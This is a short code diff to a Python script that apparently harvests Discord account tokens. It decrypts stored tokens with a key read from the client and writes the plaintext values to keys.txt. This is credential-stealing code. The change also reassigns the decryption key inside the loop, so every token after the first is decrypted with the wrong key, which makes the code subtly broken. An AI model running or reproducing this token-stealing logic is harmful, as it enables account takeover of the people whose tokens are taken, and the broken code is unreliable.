@@ -43,15 +43,16 @@ def main():
         print("No tokens found or an error occurred.")
         return
     for token in tokens:
-        print(decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:]))
+        key = (decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:]))
         out = open("keys.txt", "a", encoding="utf-8")
-        out.write(token + "\n")
+        out.write(key + "\n")
         out.close()
         
 
 
 if __name__ == "__main__":
     main()
+
 
 
 
